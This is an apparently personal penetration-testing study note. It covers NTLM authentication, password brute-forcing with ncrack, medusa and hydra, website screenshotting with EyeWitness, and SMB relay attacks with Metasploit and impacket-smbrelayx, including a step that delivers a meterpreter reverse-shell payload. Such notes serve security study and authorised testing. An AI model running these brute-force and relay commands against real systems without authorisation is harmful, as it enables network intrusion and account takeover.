> Vulnerabilities on the target system and how to exploit them

This is usually achieved through vulnerability assessment (which can be done through scanners like: `nessus`, `nexpose` etc.)

Exploits can usually be devides into 3 categories
- client-side exploit (usually requires interaction from the user)
- remote exploits, attack services listening on the network (no interaction required)
- local privilege escalation

## Basic information

### NTLM

NT Lan Manager, authentication system used by windows in the past and still today (newer versions  or Kerberos). It uses 3 message types in order to establish authentication:

- 1: negotiation --> client2server contains username
- 2: challenge --> server2client contains challenge
- 3: response --> client2server encrypt challenge with hash of user pw

Crypto schemes used with NTLM
- LM: `ASCII` capital chars and `DES` (known ciphertext: `KGS!@#$%`)
- NTLM: `UNICODE` chars and `MD4`
- NTLMv2: including timestamps, making every request unique - also per resource specific information is included (username, servername of the requested service). Cracking infeasible IF password is strong enough

Windows Vista and above use at least `NTLMv2`

## Low hanging fruits

> Usually default or weak passwords, accessible config files, misconfigured servers or software, bad permissions, null sessions, unpatched systems and so on

### Cracking weak passwords

- using `ncrack`

```bash
ncrack <servicename>://<target>:<optionalPort> <servicename>://<target>:<optionalPort> # multiple also possible

ncrack ssh://10.10.10.66
# OR
ncrack 10.10.10.10,15 -p ssh:50,telnet # global definiton of services to scan with 2 ips to check
```

- using `medusa`

```bash
medusa -h 192.168.102.149 -M telnet -U username.lst -P password.lst
```

- using `hydra`

```bash
hydra -l <loginName> -P <pathToWordlist> ssh://10.10.10.66
```

### Screening websites

> Making screenshots of urls

```bash
eyewitness --prepend-https -f <path2FileWithURLs>  # optional --active-scan but its loud
```

Creates a screenshot of the website and also provides other information (IP, hostname etc.)

## SMB relay attack

> Intercepting an SMB connection via MITM and relaying the request while sitting on the connection (should work with v1/v2)

![[smb_relay_ntlm1.png]]

### 0. Prerequisites

- victim must have admin privileges on the target
- MITM position of the attacker
- `ntlm` must be in use

### 1. exploit using metasploit 

```bash
msfconsole
> use exploit/windows/smb/smb_relay
> show options  # and set them accordingly
```

MITM must be established beforehand!

### 0. Prerequisites (impacket)

- meterpreter payload with reverse shell (`msfvenom`)
- running handler in metasploit

### 1. Start smbrelayx

```bash
impacket-smbrelayx -h <targetHost> -e <pathToPayload>
```

OR for an interactive session run:

```bash
impacket-smbrelayx -h <targetHost> -socks

proxychains -q impacket-smbexec <domain>/<user>@<targetHost>  # domain and user is display in smbrelayx
```

the interactive session doesn't require meterpreter handler.